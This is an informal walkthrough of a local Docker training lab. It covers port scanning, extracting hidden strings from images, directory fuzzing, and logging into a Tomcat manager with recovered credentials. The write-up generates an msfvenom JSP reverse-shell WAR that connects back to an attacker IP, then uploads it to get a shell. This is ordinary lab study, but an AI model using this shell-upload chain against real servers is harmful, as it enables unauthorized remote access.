﻿# Infosec Warrior WEB-Lab: v2 Walkthrough

Hello! The first step is to pull the Docker image using this command:

```bash
docker pull infosecwarrior/web-lab:v3
```
After pulling the image, run the Docker container. If you are running Docker in a virtual machine, make sure to bind ports using this command:
```bash
docker run -dt -p 8080:8080 -p 8090:8090  infosecwarrior/web-lab:v3

![run](https://run.png)	

When Docker starts correctly, I proceed to the enumeration step. I scan ports and check which services are running on those ports.
```bash
nmap -p8080,8090  192.168.1.48 -sc -sV -A
```
![nmap] (https://1.png)	

After spending time on the website, we couldn't find any useful information.

![dir] (https://2.png)	

we discovered an image .

![image] (https://3.png)

we discovered an image hiding hash find . 
```bash
 strings im_watching.jpg
```
![strings] (https://4.png)

I Crack hash https://crackstation.net/

![Crack hash] (https://5.png)

After spending time on the website, I decided directory fuzzing and find user directory.

```bash
ffuf -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://192.168.1.48:8080/FUZZ
```
![ffuf] (https://6.png)	

we discovered an tom image .

![image] (https://7.png)

we discovered an image hiding directory find . 
```bash
 strings tom.jpg
```
and find jarry_user/

![strings] (https://8.png)

we discovered an user.txt and I found armour user

![user.txt] (https://9.png)

I chack port 8090 and run tomcat cms 


![CMS] (https://10.png)

manager app login credentials armour and @itachi

![Login] (https://11.png)

I create rev shell 
```bash
msfvenom -p java/jsp_shell_reverse_tcp LHOST=192.168.1.22 LPORT=80 -f war > shell.war
```
![msfvenom] (https://12.png)

I upload war file 

![upload] (https://13.png)

Run netcat listener on the port specified in the file.

![nc] (https://14.png)

Upload the file to the CMS and then click on the shell.war .

![click] (https://15.png)

bOOm i got shell

![shell] (https://16.png)



